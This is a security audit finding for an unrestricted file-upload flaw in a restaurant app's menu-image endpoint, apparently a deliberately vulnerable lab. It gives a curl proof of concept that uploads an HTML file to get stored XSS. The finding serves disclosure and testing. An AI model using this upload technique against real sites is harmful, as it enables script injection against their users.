# H8 — Unrestricted File Upload: Menu Asset (V15)

**Severity:** High  
**CWE:** CWE-434 | **OWASP:** A05:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-015-v15-unrestricted-upload.md`

## Summary

Any authenticated user can upload any file (extension, content) to a publicly served directory. Combined with no `X-Content-Type-Options: nosniff` (F-A6), an uploaded `.html` becomes stored XSS in the same origin as the SPA.

## PoC

```bash
curl -X POST http://localhost:4443/api/admin/menu/upload-image \
  -H "Cookie: restaurant_session=<any_session>" \
  -F "menu_item_id=1" \
  -F "image=@evil.html;type=text/html"
# Response: {"public_url":"/static/uploads/menus/evil.html", ...}
# Visit: http://localhost:4444/static/uploads/menus/evil.html
```

Requires `ENABLE_ADVANCED_VULNS=true`.
